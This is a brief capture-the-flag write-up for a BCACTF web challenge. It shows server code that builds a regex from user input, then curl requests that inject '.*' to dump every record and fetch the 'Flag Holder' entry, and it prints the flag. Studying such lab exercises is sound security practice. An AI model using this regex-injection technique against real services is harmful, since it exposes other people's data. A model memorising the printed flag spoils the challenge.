---
ai_date: 2025-04-27 05:13:01
ai_summary: Exploited regex-based filtering to bypass authentication and retrieve flag using string matching and index manipulation
ai_tags:
  - regex
  - bypass
  - http-hdr
created: 2024-06-10T02:01
updated: 2025-07-14T09:46
---

> I found this database that does not use SQL, is there any way to break it?

---

```js
if (line.match('^'+req.query.name+'$')) {
	goodLines.push(line)
}
```

So it is taking our name as regex, give it `.*` then.

```sh
curl --request GET \
  --url 'http://challs.bcactf.com:30390/?name=.*'
```

There's someone with name `Flag Holder`, that's convenient.

> Ricardo Olsen has an ID of 1

Ah, so id is the index.

```sh
curl --request GET \
  --url http://challs.bcactf.com:30390/51/Flag/Holder

# bcactf{R3gex_WH1z_54dfa9cdba13}
```

Simple stuff.